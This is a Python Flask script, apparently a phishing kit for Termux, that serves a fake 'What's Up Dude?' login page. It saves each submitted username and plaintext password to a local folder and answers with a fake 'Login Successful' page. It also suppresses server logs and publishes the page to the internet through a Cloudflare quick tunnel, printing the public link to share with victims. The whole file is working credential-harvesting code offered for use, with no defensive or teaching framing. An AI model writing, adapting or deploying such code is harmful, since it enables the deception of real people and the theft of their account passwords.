# FileName: WhatsUpDudePage.py

import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)  # Effectively silence
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    """A dummy file-like object to suppress output."""
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
# Credentials will be saved in your Downloads/WhatsUpDude directory
BASE_FOLDER = os.path.expanduser("~/storage/downloads/WhatsUpDude")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    """Serves the main login page."""
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>What's Up Dude?</title>
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Green & Black Theme */
                --background-color: #121212;
                --container-bg: #1a1a1a;
                --primary-green: #00ff7f; /* Spring Green */
                --text-color: #e0e0e0;
                --border-color: #2c2c2c;
                --input-bg: #252525;
                --button-hover: #00e673;
                --link-color: var(--primary-green);
                --shadow-color: rgba(0, 255, 127, 0.1);
            }

            body {
                font-family: 'Montserrat', sans-serif;
                background-color: var(--background-color);
                color: var(--text-color);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
            }

            .container {
                background-color: var(--container-bg);
                border: 1px solid var(--border-color);
                border-top: 3px solid var(--primary-green);
                width: 100%;
                max-width: 380px;
                padding: 40px;
                text-align: center;
                box-sizing: border-box;
                border-radius: 10px;
                box-shadow: 0 5px 25px var(--shadow-color);
            }

            .title {
                font-size: 2.5em;
                font-weight: 700;
                color: var(--primary-green);
                margin: 0 0 30px 0;
                text-shadow: 0 0 10px rgba(0, 255, 127, 0.3);
            }

            .input-field input {
                width: 100%;
                padding: 14px 12px;
                margin-bottom: 12px;
                border: 1px solid var(--border-color);
                border-radius: 5px;
                background-color: var(--input-bg);
                font-size: 16px;
                box-sizing: border-box;
                color: var(--text-color);
                transition: border-color 0.3s, box-shadow 0.3s;
            }

            .input-field input::placeholder {
                color: #666;
            }

            .input-field input:focus {
                border-color: var(--primary-green);
                box-shadow: 0 0 8px rgba(0, 255, 127, 0.2);
                outline: none;
            }

            .login-button {
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 5px;
                background-color: var(--primary-green);
                color: #121212;
                font-weight: 700;
                font-size: 16px;
                cursor: pointer;
                margin-top: 20px;
                transition: background-color 0.2s ease, transform 0.2s ease;
            }

            .login-button:hover {
                background-color: var(--button-hover);
                transform: translateY(-2px);
            }
            
            .forgot-password {
                display: block;
                margin-top: 25px;
                color: var(--link-color);
                font-size: 14px;
                text-decoration: none;
            }

            .forgot-password:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="title">What's Up Dude?</h1>
            <form action="/login" method="post">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Username" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button">Log In</button>
            </form>
            <a href="#" class="forgot-password">Forgot Password?</a>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    """Handles the form submission and saves the credentials."""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Username and password are required!", 400

    # Sanitize the username to create a safe filename
    safe_username = secure_filename(username)
    timestamp_file = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp_file}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Connecting...</title>
      <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
            --background-color: #121212;
            --text-color: #e0e0e0;
            --primary-green: #00ff7f;
        }
        body {
          font-family: 'Montserrat', sans-serif;
          margin: 0; 
          padding: 20px;
          display: flex; 
          justify-content: center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--background-color);
          color: var(--text-color);
        }
        .container {
          text-align: center;
        }
        h2 {
          color: var(--primary-green);
          font-size: 2em;
        }
        p {
          font-size: 1.2em;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Login Successful!</h2>
        <p>Connecting to the server... please wait.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    """Starts a Cloudflare tunnel and prints the public URL."""
    # Command to start the tunnel
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in iter(process.stdout.readline, ''):
        # Search for the public URL in the output
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"✅ What's Up Dude? Public Link: {tunnel_url}")
            sys.stdout.flush()
            # Don't break here, let it continue printing logs if any
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run Flask app in a separate thread
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting server and Cloudflare tunnel...")

    # Start and manage the Cloudflare tunnel process
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        # Keep the main thread alive, waiting for the tunnel process to exit
        cloudflared_process.wait()
    except KeyboardInterrupt:
        print("\n shutting down...")
        cloudflared_process.terminate()
        sys.exit(0)